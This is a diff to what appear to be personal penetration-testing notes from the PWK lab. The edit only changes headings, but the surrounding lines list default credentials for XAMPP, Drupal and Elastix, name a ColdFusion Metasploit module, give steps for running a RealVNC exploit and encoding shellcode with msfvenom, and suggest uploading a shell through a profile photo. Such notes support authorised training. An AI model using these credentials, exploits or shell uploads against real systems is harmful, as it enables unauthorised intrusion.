@@ -183,11 +183,11 @@ ref : https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-201
 
 exploit/windows/http/coldfusion_fckeditor - only for 8.0.1
 
-## - XAMPP ** <br />
+## - XAMPP  <br />
 XAMPP	cred(wampp/xampp)
 
 
-## - RealVNC ** <br />
+## - RealVNC <br />
 RealVNC	: https://www.exploit-db.com/exploits/36932
 Edit, BIND_ADDR into mine and BIND_PORT into 4444
 root@kali:~/PWK-Lab/10.11.1.227$python RealVNC-exploit-36932.py 
@@ -211,7 +211,7 @@ cat shellcode | msfvenom -e x86/shikata_ga_nai -b ""\x00"" -a x86 --platform win
 ```
 
 
-## - misc  <br />
+## - MISC  <br />
 Drupal	cred(admin/admin)
 Elastix	"cred(admin/admin) http://example.com/vtigercrm/ 
 You might be able to upload shell in profile-photo.
